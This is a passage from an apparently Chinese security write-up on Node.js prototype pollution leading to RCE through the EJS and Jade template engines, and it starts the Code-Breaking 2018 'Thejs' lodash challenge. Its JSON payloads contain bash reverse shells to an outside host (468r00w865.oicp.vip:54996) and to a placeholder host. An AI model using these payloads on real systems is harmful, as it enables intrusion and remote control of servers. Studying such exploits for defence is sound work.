punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> cookieParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'cookie-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> logger <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'morgan'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> FileStore <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'session-file-store'</span><span class="token punctuation">)</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> indexRouter <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./routes/index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> loginRouter <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./routes/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">...</span><span class="token operator">...</span>#使用ejs模板引擎app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'views'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">engine</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__express<span class="token punctuation">)</span><span class="token punctuation">;</span> app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/image-20220906140645956.png" alt="image-20220906140645956"></p><p>存在copy，merge等函数</p><p><img src="/images/image-20220906140848143.png" alt="image-20220906140848143"></p><p>来看下ejs的原型链</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span><span class="token string-property property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string-property property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string-property property">"outputFunctionName"</span><span class="token operator">:</span><span class="token string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >&amp; /dev/tcp/468r00w865.oicp.vip/54996 0>&amp;1\"');var __tmp2"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/image-20220906152858354.png" alt="image-20220906152858354"></p><p>opt.outputFunctionName&#x3D;<code>_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/468r00w865.oicp.vip/54996 0&gt;&amp;1\&quot;&#39;);var __tmp2</code></p><p>拼接后：</p><p>prepended&#x3D;<code>var _tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/468r00w865.oicp.vip/54996 0&gt;&amp;1\&quot;&#39;);var __tmp2=__append;</code></p><p>然后prepended经过一些拼接字符串，然后赋值给source</p><p><img src="/images/image-20220906153355247.png" alt="image-20220906153355247"></p><p>再赋值给src<img src="/images/image-20220906153412602.png" alt="image-20220906153412602"></p><p><img src="/images/image-20220906153452065.png" alt="image-20220906153452065"></p><p>src传入Function构造函数,作为函数体</p><p><img src="/images/image-20220906153630011.png" alt="image-20220906153630011"></p><p>Fn进行调用，就可以调用经过污染的函数体</p><h3 id="5、JadeRCE"><a href="#5、JadeRCE" class="headerlink" title="5、JadeRCE"></a>5、JadeRCE</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> createError <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http-errors'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> ejs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> cookieParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'cookie-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> logger <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'morgan'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> FileStore <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'session-file-store'</span><span class="token punctuation">)</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> indexRouter <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./routes/index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> loginRouter <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./routes/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>#使用jade模板引擎app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'views'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">engine</span><span class="token punctuation">(</span><span class="token string">'jade'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jade'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__express<span class="token punctuation">)</span><span class="token punctuation">;</span> app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'jade'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/468r00w865.oicp.vip/54996 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></p><h4 id="Step-1-jade的入口函数exports-express"><a href="#Step-1-jade的入口函数exports-express" class="headerlink" title="Step 1 jade的入口函数exports.__express"></a>Step 1 jade的入口函数exports.__express</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">exports<span class="token punctuation">.</span><span class="token function-variable function">__express</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">path<span class="token punctuation">,</span> options<span class="token punctuation">,</span> fn</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>compileDebug <span class="token operator">==</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">NODE_ENV</span> <span class="token operator">===</span> <span class="token string">'production'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    options<span class="token punctuation">.</span>compileDebug <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  exports<span class="token punctuation">.</span><span class="token function">renderFile</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> options<span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <strong>options.compileDebug</strong> 无初始值，可以覆盖开启 Debug 模式 </p><p>但是覆盖后却报错</p><pre class="line-numbers language-none"><code class="language-none">TypeError: plugin is not a function    at Parser.loadPlugins (.&#x2F;node_modules&#x2F;acorn&#x2F;dist&#x2F;acorn.js:1629:7)    at new Parser (.&#x2F;node_modules&#x2F;acorn&#x2F;dist&#x2F;acorn.js:1561:10)    at Object.parse (.&#x2F;node_modules&#x2F;acorn&#x2F;dist&#x2F;acorn.js:905:10)    at reallyParse (.&#x2F;node_modules&#x2F;acorn-globals&#x2F;index.js:30:18)    at findGlobals (.&#x2F;node_modules&#x2F;acorn-globals&#x2F;index.js:45:11)    at addWith (.&#x2F;node_modules&#x2F;with&#x2F;index.js:44:28)    at parse (.&#x2F;node_modules&#x2F;jade&#x2F;lib&#x2F;index.js:149:9)    at Object.exports.compile (.&#x2F;node_modules&#x2F;jade&#x2F;lib&#x2F;index.js:205:16)    at handleTemplateCache (.&#x2F;node_modules&#x2F;jade&#x2F;lib&#x2F;index.js:174:25)    at Object.exports.renderFile (.&#x2F;node_modules&#x2F;jade&#x2F;lib&#x2F;index.js:381:10)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过分析报错调用栈可知其异常发生在编译过程，因此我们继续往下看。</p><h4 id="Step-2-编译过程-exports-compile"><a href="#Step-2-编译过程-exports-compile" class="headerlink" title="Step 2 编译过程 exports.compile"></a>Step 2 编译过程 exports.compile</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">exports<span class="token punctuation">.</span><span class="token function-variable function">compile</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">str<span class="token punctuation">,</span> options</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> options <span class="token operator">=</span> options <span class="token operator">||</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token punctuation">,</span> filename <span class="token operator">=</span> options<span class="token punctuation">.</span>filename      <span class="token operator">?</span> utils<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>      <span class="token operator">:</span> <span class="token string">'undefined'</span>    <span class="token punctuation">,</span> fn<span class="token punctuation">;</span>  str <span class="token operator">=</span> <span class="token function">String</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> parsed <span class="token operator">=</span> <span class="token function">parse</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> options<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Step-3-编译解析-exports-compile-gt-parse"><a href="#Step-3-编译解析-exports-compile-gt-parse" class="headerlink" title="Step 3 编译解析 exports.compile -&gt; parse"></a>Step 3 编译解析 exports.compile -&gt; parse</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// ...</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Parse</span>    tokens <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// ...</span><span class="token comment">// Compile</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    js <span class="token operator">=</span> compiler<span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// ...</span><span class="token keyword">var</span> body <span class="token operator">=</span> <span class="token string">''</span>    <span class="token operator">+</span> <span class="token string">'var buf = [];\n'</span>    <span class="token operator">+</span> <span class="token string">'var jade_mixins = &#123;&#125;;\n'</span>    <span class="token operator">+</span> <span class="token string">'var jade_interp;\n'</span>    <span class="token operator">+</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>self      <span class="token operator">?</span> <span class="token string">'var self = locals || &#123;&#125;;\n'</span> <span class="token operator">+</span> js      <span class="token operator">:</span> <span class="token function">addWith</span><span class="token punctuation">(</span><span class="token string">'locals || &#123;&#125;'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span> <span class="token operator">+</span> js<span class="token punctuation">,</span> globals<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">';'</span>    <span class="token operator">+</span> <span class="token string">'return buf.join("");'</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">body</span><span class="token operator">:</span> body<span class="token punctuation">,</span> <span class="token literal-property property">dependencies</span><span class="token operator">:</span> parser<span class="token punctuation">.</span>dependencies <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解析 -&gt; 编译 -&gt; 返回编译后代码。</p><h4 id="Step-4-编译解析-exports-compile-gt-parse-gt-compile"><a href="#Step-4-编译解析-exports-compile-gt-parse-gt-compile" class="headerlink" title="Step 4 编译解析 exports.compile -&gt; parse -&gt; compile"></a>Step 4 编译解析 exports.compile -&gt; parse -&gt; compile</h4><p>凭感觉，<strong>parse</strong>可看可不看，本文主要分析编译过程，所以跳过<strong>parse</strong>.</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function-variable function">compile</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>buf <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>pp<span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span>buf<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">"var jade_indent = [];"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>lastBufferedIdx <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">visit</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//...</span>  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>buf<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译后代码存放在<strong>this.buf</strong>中，通过<strong>this.visit(this.node);<strong>遍历分析</strong>parse</strong>产生的 AST 树<strong>this.node</strong></p><p>主要寻找有哪些可控、可覆盖的变量被添加到<strong>this.buf</strong>中。可以下断动调分析，同时还可以全局搜索<code>this.buf.push(</code>！</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function-variable function">visit</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">node</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> debug <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>debug<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>buf<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">'jade_debug.unshift(new jade.DebugItem( '</span> <span class="token operator">+</span> node<span class="token punctuation">.</span>line      <span class="token operator">+</span> <span class="token string">', '</span> <span class="token operator">+</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>filename        <span class="token operator">?</span> utils<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>        <span class="token operator">:</span> <span class="token string">'jade_debug[0].filename'</span><span class="token punctuation">)</span>      <span class="token operator">+</span> <span class="token string">' ));'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// ...</span>  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">visitNode</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span>buf<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">'jade_debug.shift();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>继续看代码可见<strong>node.line</strong>和<strong>node.filename</strong>在 debug 为真的时候进入了 buf。然而<strong>node.filename</strong>被<strong>utils.stringify</strong>处理过了，无法逃逸双引号。唯有考虑 line 是否可以被覆盖了。</p><p>另外<strong>this.debug</strong>哪里来？？</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> Compiler <span class="token operator">=</span> module<span class="token punctuation">.</span><span class="token function-variable function">exports</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">Compiler</span><span class="token punctuation">(</span><span class="token parameter">node<span class="token punctuation">,</span> options</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">false</span> <span class="token operator">!==</span> options<span class="token punctuation">.</span>compileDebug<span class="token punctuation">;</span>  <span class="token comment">// ...</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>初始化<strong>Compiler</strong>的时候判断了<strong>options.compileDebug</strong>，over！</p><h4 id="Step-5-注入测试"><a href="#Step-5-注入测试" class="headerlink" title="Step 5 注入测试"></a>Step 5 注入测试</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function-variable function">visit</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">node</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> debug <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>debug<span class="token punctuation">;</span>  <span class="token comment">// 注入测试</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>line <span class="token operator">==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一点一点的动调跟踪比较麻烦，直接写个判断</p><p><img src="/images/image-20220906210839988.png" alt="image-20220906210839988"></p><p>可见当 node 为 Block 的时候 line 是不存在的。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">node<span class="token punctuation">.</span>line <span class="token operator">==</span> <span class="token keyword">undefined</span>node<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>line <span class="token operator">==</span> <span class="token keyword">undefined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>理论上覆盖了 line 就可以达到注入的目的！</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"compileDebug"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"self"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"line"</span><span class="token operator">:</span><span class="token string">"console.log('test inject')"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Step-6-RCE"><a href="#Step-6-RCE" class="headerlink" title="Step 6 RCE"></a>Step 6 RCE</h4><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"compileDebug"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"self"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"line"</span><span class="token operator">:</span><span class="token string">"console.log(global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >&amp; /dev/tcp/xxx/6666 0>&amp;1\"'))"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="6、Code-Breaking-2018-Thejs"><a href="#6、Code-Breaking-2018-Thejs" class="headerlink" title="6、Code-Breaking 2018 Thejs"></a>6、Code-Breaking 2018 Thejs</h3><p>server.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token keyword">const</span> lodash <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">)</span><span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span><span class="token keyword">const</span> randomize <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'randomatic'</span><span class="token punctuation">)</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/static'</span><span class="token punctuation">,</span> express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span><span class="token string">'static'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'thejs.session'</span><span class="token punctuation">,</span>    <span class="token literal-property property">secret</span><span class="token operator">:</span> <span class="token function">randomize</span><span class="token punctuation">(</span><span class="token string">'aA0'</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token literal-property property">resave</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    <span class="token literal-property property">saveUninitialized</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">engine</span><span class="token punctuation">(</span><span class="token string">'ejs'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">filePath<span class="token punctuation">,</span> options<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// define the template engine</span>    fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>filePath<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> content</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">callback</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">let</span> compiled <span class="token operator">=</span> lodash<span class="token punctuation">.</span><span class="token function">template</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>        <span class="token keyword">let</span> rendered <span class="token operator">=</span> <span class="token function">compiled</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token operator">...</span>options<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token function">callback</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> rendered<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> <span class="token string">'./views'</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'ejs'</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 定义session</span>    <span class="token keyword">let</span> data <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data <span class="token operator">||</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">language</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token literal-property property">category</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 获取post数据并合并</span>        data <span class="token operator">=</span> lodash<span class="token punctuation">.</span><span class="token function">merge</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">)</span>        req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data <span class="token operator">=</span> data        <span class="token comment">// 再将data赋值给session</span>    